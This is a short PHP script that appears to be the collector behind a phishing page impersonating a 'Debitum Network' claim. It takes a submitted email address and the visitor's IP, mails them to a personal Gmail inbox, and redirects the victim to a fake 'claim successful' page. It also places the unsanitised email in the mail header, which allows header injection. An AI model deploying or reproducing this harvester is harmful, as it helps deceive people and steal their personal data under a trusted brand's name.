<?php
$email = $_POST['email'];
$ip = $_POST['ip'];
$ip = $_SERVER['REMOTE_ADDR'];

$formcontent=" User: $email \n ip: $ip";
$recipient = "trendsalevip@gmail.com";
$subject = "deb";

$mailheader = "From: $email \r\n";
mail($recipient, $subject, $formcontent, $mailheader) or die("Error!");
echo "Thank You!" . " -" . "<a href='https://debitum.site/Debitum-Network-Claim-Successfully.htm'> Return Home</a>";
header("Location: https://debitum.site/Debitum-Network-Claim-Successfully.htm");
?>
